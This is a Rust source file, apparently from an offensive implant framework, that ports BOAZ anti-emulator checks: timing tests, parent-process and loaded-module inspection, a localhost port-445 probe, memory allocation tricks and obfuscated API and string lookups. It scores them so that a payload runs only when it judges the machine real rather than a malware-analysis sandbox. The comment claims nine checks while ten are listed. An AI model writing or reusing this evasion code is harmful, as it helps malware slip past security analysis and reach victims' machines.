//! Anti-sandbox / anti-emulator checks (BOAZ anti_emu port).
//!
//! Returns `true` when the environment looks like a real machine,
//! `false` when it looks like a sandbox or emulator.

use core::ffi::c_void;
use core::mem::{size_of, zeroed};
use core::ptr::null_mut;

use crate::types::{MEM_COMMIT, MEM_RESERVE, PAGE_NOACCESS, PAGE_READWRITE, TH32CS_SNAPPROCESS};
use malefic_os_win::kit::binding::{
    MCreateToolhelp32Snapshot, MGetCurrentProcessId, MGetProcAddress, MLoadLibraryA,
    MProcess32First, MProcess32Next, MVirtualAlloc, MVirtualAllocExNuma,
};

/// Maximum path length for process names
const MAX_PATH: usize = 260;

/// PROCESSENTRY32 — mirrors Types.rs PROCESSENTRY32 for local use.
#[repr(C)]
struct ProcessEntry32 {
    dw_size: u32,
    cnt_usage: u32,
    th32_process_id: u32,
    th32_default_heap_id: usize,
    th32_module_id: u32,
    cnt_threads: u32,
    th32_parent_process_id: u32,
    pc_pri_class_base: i32,
    dw_flags: u32,
    sz_exe_file: [u8; MAX_PATH],
}

impl ProcessEntry32 {
    fn zeroed() -> Self {
        let mut e: Self = unsafe { zeroed() };
        e.dw_size = size_of::<Self>() as u32;
        e
    }
    fn name_bytes(&self) -> &[u8] {
        let end = self
            .sz_exe_file
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(MAX_PATH);
        &self.sz_exe_file[..end]
    }
}

// ─── Individual checks ───────────────────────────────────────────────────────

/// fs1: write a known pattern to a temp file and read it back.
fn fs1() -> bool {
    let tmp = std::env::temp_dir().join("~tmpchk.dat");
    let pattern = obf_cstr!(b"REALENV_CHECK_2025");
    if std::fs::write(&tmp, &pattern).is_err() {
        return false;
    }
    let result = std::fs::read(&tmp).unwrap_or_default();
    let _ = std::fs::remove_file(&tmp);
    result == pattern
}

/// fs2: a real DLL (ntdll) must load; a fake one must fail.
fn fs2() -> bool {
    let real = obf_cstr!(b"ntdll.dll\0");
    let fake = obf_cstr!(b"__nonexistent_totally_fake__.dll\0");
    unsafe {
        let h_real = MLoadLibraryA(real.as_ptr());
        let h_fake = MLoadLibraryA(fake.as_ptr());
        !h_real.is_null() && h_fake.is_null()
    }
}

/// time2: Sleep(300ms) should advance GetTickCount by ≥ 250ms.
fn time2() -> bool {
    use std::time::Instant;
    let t0 = Instant::now();
    std::thread::sleep(std::time::Duration::from_millis(300));
    t0.elapsed().as_millis() >= 250
}

/// time3: a thread that loops for a set count; compare wall-clock vs count.
fn time3() -> bool {
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::sync::Arc;
    let counter = Arc::new(AtomicU64::new(0));
    let counter2 = counter.clone();
    let t0 = std::time::Instant::now();
    let h = std::thread::spawn(move || {
        for _ in 0..5_000_000u64 {
            counter2.fetch_add(1, Ordering::Relaxed);
        }
    });
    let _ = h.join();
    let elapsed = t0.elapsed().as_millis();
    // In a real machine, 5M iterations should be nearly instantaneous (< 500ms).
    // Sandboxes often slow-path threads → much longer.
    counter.load(Ordering::Relaxed) == 5_000_000 && elapsed < 2000
}

/// instrumentation9: parent process should be explorer, cmd, or powershell.
fn instrumentation9() -> bool {
    unsafe {
        let snapshot = MCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot.is_null() || snapshot == -1isize as *mut c_void {
            return false;
        }
        let my_pid = MGetCurrentProcessId();
        let mut entry = ProcessEntry32::zeroed();
        let mut parent_pid: u32 = 0;

        // Find our own parent PID
        if MProcess32First(snapshot, &mut entry as *mut _ as *mut c_void) {
            loop {
                if entry.th32_process_id == my_pid {
                    parent_pid = entry.th32_parent_process_id;
                    break;
                }
                if !MProcess32Next(snapshot, &mut entry as *mut _ as *mut c_void) {
                    break;
                }
                entry = ProcessEntry32::zeroed();
            }
        }

        // Find parent process name
        let mut found = false;
        if parent_pid != 0 {
            let mut e2 = ProcessEntry32::zeroed();
            if MProcess32First(snapshot, &mut e2 as *mut _ as *mut c_void) {
                loop {
                    if e2.th32_process_id == parent_pid {
                        let name = e2.name_bytes().to_ascii_lowercase();
                        let explorer_name = obf_cstr!(b"explorer");
                        let cmd_name = obf_cstr!(b"cmd.exe");
                        let ps_name = obf_cstr!(b"powershell");
                        found = name.windows(8).any(|w| w == explorer_name.as_slice())
                            || name.windows(7).any(|w| w == cmd_name.as_slice())
                            || name.windows(11).any(|w| w == ps_name.as_slice());
                        break;
                    }
                    if !MProcess32Next(snapshot, &mut e2 as *mut _ as *mut c_void) {
                        break;
                    }
                    e2 = ProcessEntry32::zeroed();
                }
            }
        }
        malefic_os_win::kit::binding::MCloseHandle(snapshot);
        parent_pid != 0 && found
    }
}

/// network445: attempt a TCP connection to localhost:445.
fn network445() -> bool {
    use std::net::TcpStream;
    use std::time::Duration;
    let addr = obf_cstr!(b"127.0.0.1:445\0");
    let addr_str = std::str::from_utf8(&addr[..addr.len() - 1]).unwrap();
    TcpStream::connect_timeout(&addr_str.parse().unwrap(), Duration::from_millis(500)).is_ok()
}

/// numa_func: VirtualAllocExNuma should succeed on real NUMA systems;
/// sandboxes often return NULL.
fn numa_func() -> bool {
    unsafe {
        use malefic_os_win::kit::binding::MGetCurrentProcess;
        let h = MGetCurrentProcess();
        let p = MVirtualAllocExNuma(
            h,
            null_mut(),
            1024,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
            0,
        );
        !p.is_null()
    }
}

/// god_father: allocate 1 GiB; real systems have the address space.
fn god_father() -> bool {
    unsafe {
        let p = MVirtualAlloc(null_mut(), 1 << 30, MEM_RESERVE, PAGE_NOACCESS);
        !p.is_null()
    }
}

/// god_mother: count loop iterations in 100ms — real CPUs are much faster.
fn god_mother() -> bool {
    use std::time::Instant;
    let t0 = Instant::now();
    let mut count: u64 = 0;
    while t0.elapsed().as_millis() < 100 {
        count += 1;
    }
    // A real machine should exceed ~10M in 100ms.
    count > 10_000_000
}

/// instrumentation1: count loaded modules via toolhelp snapshot —
/// a real process has many; sandboxes are typically sparse.
fn instrumentation1() -> bool {
    const TH32CS_SNAPMODULE: u32 = 0x00000008;
    // MODULEENTRY32 on x64 is 568 bytes (verified via Marshal::SizeOf)
    #[repr(C)]
    struct ModEntry {
        dw_size: u32,
        rest: [u8; 564],
    }
    unsafe {
        let snap = MCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, MGetCurrentProcessId());
        if snap.is_null() || snap == -1isize as *mut c_void {
            return false;
        }
        let mut me: ModEntry = zeroed();
        me.dw_size = core::mem::size_of::<ModEntry>() as u32;

        type SnapIterFn = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
        let _obf_kernel32_dll = obf_cstr!(b"kernel32.dll\0");
        let lib = MLoadLibraryA(_obf_kernel32_dll.as_ptr());
        if lib.is_null() {
            malefic_os_win::kit::binding::MCloseHandle(snap);
            return false;
        }
        let _obf_module32first = obf_cstr!(b"Module32First\0");
        let m32first = MGetProcAddress(lib as *const c_void, _obf_module32first.as_ptr());
        let _obf_module32next = obf_cstr!(b"Module32Next\0");
        let m32next = MGetProcAddress(lib as *const c_void, _obf_module32next.as_ptr());
        if m32first.is_null() || m32next.is_null() {
            malefic_os_win::kit::binding::MCloseHandle(snap);
            return false;
        }
        let first_fn: SnapIterFn = core::mem::transmute(m32first);
        let next_fn: SnapIterFn = core::mem::transmute(m32next);

        let mut count = 0usize;
        if first_fn(snap, &mut me as *mut _ as *mut c_void) != 0 {
            count += 1;
            loop {
                me.dw_size = core::mem::size_of::<ModEntry>() as u32;
                if next_fn(snap, &mut me as *mut _ as *mut c_void) == 0 {
                    break;
                }
                count += 1;
            }
        }
        malefic_os_win::kit::binding::MCloseHandle(snap);
        count > 5
    }
}

// ─── Aggregate ───────────────────────────────────────────────────────────────

/// Run all checks; return `true` when the environment appears genuine.
///
/// The scoring strategy matches the original BOAZ implementation:
/// at least 6 of the 9 checks must pass.
pub fn execute_all_checks() -> bool {
    let checks: &[(&str, fn() -> bool)] = &[
        ("fs1", fs1),
        ("fs2", fs2),
        ("time2", time2),
        ("time3", time3),
        ("instrumentation9", instrumentation9),
        ("network445", network445),
        ("numa_func", numa_func),
        ("god_father", god_father),
        ("god_mother", god_mother),
        ("instrumentation1", instrumentation1),
    ];

    let mut passed = 0usize;
    for (name, check) in checks {
        let result = check();
        debug_println!(
            "[anti_emu] {:20} => {}",
            name,
            if result { "PASS" } else { "FAIL" }
        );
        if result {
            passed += 1;
        }
    }
    debug_println!(
        "[anti_emu] Result: {}/{} passed (threshold: 6)",
        passed,
        checks.len()
    );
    passed >= 6
}
